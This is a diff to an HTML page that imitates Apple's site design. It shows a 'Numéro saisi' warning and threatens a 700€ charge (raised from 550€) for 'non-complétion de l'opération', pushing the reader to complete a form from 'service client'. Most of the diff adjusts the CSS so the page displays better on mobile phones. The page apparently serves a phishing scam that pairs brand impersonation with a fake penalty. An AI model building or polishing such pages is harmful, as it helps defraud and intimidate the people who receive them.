@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Traitement</title>
   <style>
+    /* Style général */
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
       margin: 0;
@@ -12,7 +13,7 @@
       color: #f5f5f7;
     }
 
-    /* Header stylé comme celui d'Apple */
+    /* Header type Apple */
     header {
       background-color: #1c1c1e;
       padding: 0 20px;
@@ -44,35 +45,67 @@
       height: 20px;
     }
 
-    /* Style principal */
+    /* Contenu principal */
     main {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 20px;
-      height: 80vh;
+      min-height: 80vh;
     }
     .warning {
-      font-size: 20px;
+      font-size: 18px;
       color: #ffcc00;
       margin: 20px 0;
+      text-align: center;
     }
     .error-message {
       background-color: #1c1c1e;
       border: 1px solid #ff3b30;
       border-radius: 5px;
-      padding: 20px;
+      padding: 15px;
       color: #ff3b30;
-      width: 80%;
+      width: 90%;
       max-width: 400px;
       text-align: center;
     }
 
-    /* Responsive */
+    /* Responsive pour téléphone */
     @media (max-width: 768px) {
       header nav a {
         margin: 0 10px;
+        font-size: 12px;
+      }
+      header img {
+        height: 18px;
+      }
+      main {
+        padding: 10px;
+      }
+      .warning {
+        font-size: 16px;
+      }
+      .error-message {
+        padding: 10px;
+        font-size: 14px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      header nav a {
+        margin: 0 5px;
+        font-size: 11px;
+      }
+      header img {
+        height: 16px;
+      }
+      .warning {
+        font-size: 14px;
+      }
+      .error-message {
+        padding: 8px;
+        font-size: 12px;
       }
     }
   </style>
@@ -98,7 +131,7 @@
     <h1>⚠️ Avertissement ⚠️</h1>
     <p class="warning">Numéro saisi : <span id="phone"></span></p>
     <div class="error-message">
-      <p>Ce numéro sera facturé <strong>550€</strong> pour non-complétion de l'opération.</p>
+      <p>Ce numéro sera facturé <strong>700€</strong> pour non-complétion de l'opération.</p>
       <p>Veuillez remplir le formulaire envoyé par le service client pour régulariser la situation.</p>
     </div>
   </main>
